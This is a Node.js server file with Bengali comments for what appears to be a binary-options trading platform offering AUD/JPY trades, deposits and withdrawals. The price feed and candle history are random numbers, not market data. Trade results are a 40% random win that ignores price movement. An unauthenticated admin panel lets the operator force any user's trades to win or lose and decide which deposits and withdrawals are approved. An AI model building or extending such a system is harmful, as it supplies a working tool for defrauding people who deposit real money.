const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ইউজার ও ব্যালেন্স ডেটাবেজ
let users = {
  "demo_user": { 
    liveBalance: 0.03, 
    demoBalance: 11061.07, 
    activeAccount: "demo", 
    control: "normal" 
  }
};
let transactions = [];

// AUD/JPY লাইফ-টাইম ৬০ সেকেন্ড ক্যান্ডেল হিস্ট্রি
const DATA_FILE = path.join(__dirname, 'candles_audjpy.json');
let candleHistory = [];
let currentPrice = 111.650;

if (fs.existsSync(DATA_FILE)) {
  try {
    candleHistory = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    if (candleHistory.length > 0) currentPrice = candleHistory[candleHistory.length - 1].close;
  } catch (e) { candleHistory = []; }
}

if (candleHistory.length === 0) {
  let nowMinute = Math.floor(Date.now() / 60000) * 60;
  for (let i = 35; i > 0; i--) {
    let t = nowMinute - (i * 60);
    let o = currentPrice;
    let delta = (Math.random() - 0.49) * 0.040;
    let c = parseFloat((o + delta).toFixed(3));
    let h = parseFloat((Math.max(o, c) + Math.random() * 0.020).toFixed(3));
    let l = parseFloat((Math.min(o, c) - Math.random() * 0.020).toFixed(3));
    candleHistory.push({ time: t, open: o, high: h, low: l, close: c });
    currentPrice = c;
  }
}

let currentMinuteEpoch = Math.floor(Date.now() / 60000) * 60;
let currentCandle = {
  time: currentMinuteEpoch,
  open: currentPrice,
  high: currentPrice,
  low: currentPrice,
  close: currentPrice
};

// লাইভ প্রাইস ইঞ্জিন ও ক্যান্ডেল জেনারেটর
setInterval(() => {
  let delta = (Math.random() - 0.495) * 0.008;
  currentPrice = parseFloat((currentPrice + delta).toFixed(3));

  let nowMinute = Math.floor(Date.now() / 60000) * 60;

  if (nowMinute > currentCandle.time) {
    candleHistory.push({ ...currentCandle });
    fs.writeFileSync(DATA_FILE, JSON.stringify(candleHistory));
    currentCandle = {
      time: nowMinute,
      open: currentPrice,
      high: currentPrice,
      low: currentPrice,
      close: currentPrice
    };
  } else {
    if (currentPrice > currentCandle.high) currentCandle.high = currentPrice;
    if (currentPrice < currentCandle.low) currentCandle.low = currentPrice;
    currentCandle.close = currentPrice;
  }

  let remainingSeconds = 60 - Math.floor((Date.now() / 1000) % 60);

  let payload = JSON.stringify({
    type: 'TICK',
    price: currentPrice.toFixed(3),
    candle: currentCandle,
    history: candleHistory,
    countdown: remainingSeconds
  });

  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(payload);
  });
}, 1000);

// ট্রেড এক্সিকিউশন
app.post('/api/trade', (req, res) => {
  const { username, amount, direction, accountType } = req.body;
  let user = users[username] || users["demo_user"];
  let targetBalance = accountType === 'live' ? user.liveBalance : user.demoBalance;

  if (targetBalance < amount) {
    return res.json({ success: false, message: "Insufficient balance!" });
  }

  if (accountType === 'live') user.liveBalance -= amount;
  else user.demoBalance -= amount;

  let isWin = false;
  if (user.control === 'win') isWin = true;
  else if (user.control === 'loss') isWin = false;
  else isWin = (Math.random() * 100) < 40; // ৪০% উইন লজিক

  let profit = isWin ? parseFloat((amount * 1.88).toFixed(2)) : 0;
  if (isWin) {
    if (accountType === 'live') user.liveBalance += profit;
    else user.demoBalance += profit;
  }

  let finalBalance = accountType === 'live' ? user.liveBalance : user.demoBalance;

  res.json({
    success: true,
    isWin,
    profit,
    entryPrice: currentPrice.toFixed(3),
    balance: finalBalance.toFixed(2),
    direction,
    amount
  });
});

// লাইভ / ডেমো সুইচ API
app.post('/api/switch-account', (req, res) => {
  const { username, type } = req.body;
  let user = users[username] || users["demo_user"];
  user.activeAccount = type;
  res.json({ success: true, activeAccount: type, balance: type === 'live' ? user.liveBalance : user.demoBalance });
});

// ডিপোজিট ও উইথড্র
app.post('/api/deposit', (req, res) => {
  const { username, method, amount, trxId } = req.body;
  transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট জমা হয়েছে!" });
});

app.post('/api/withdraw', (req, res) => {
  const { username, method, amount, accountNo } = req.body;
  let user = users[username] || users["demo_user"];
  if (user.liveBalance >= amount) {
    user.liveBalance -= Number(amount);
    transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট সফল!" });
  } else res.json({ success: false, message: "পর্যাপ্ত ব্যালেন্স নেই!" });
});

// অ্যাডমিন রাউট (/admin নিশ্চিত করা হয়েছে)
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});
app.get('/admin-secret-panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/admin/data', (req, res) => {
  let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((s, t) => s + Number(t.amount), 0);
  let totalWithdraw = transactions.filter(t => t.type === 'Withdraw' && t.status === 'Approved').reduce((s, t) => s + Number(t.amount), 0);
  res.json({ users, transactions, totalDeposit, totalWithdraw });
});

app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if (users[username]) {
    if (action === 'control') users[username].control = value;
    res.json({ success: true });
  } else res.json({ success: false });
});

app.post('/api/admin/tx-action', (req, res) => {
  const { txId, status } = req.body;
  let tx = transactions.find(t => t.id == txId);
  if (tx) {
    tx.status = status;
    res.json({ success: true });
  } else res.json({ success: false });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
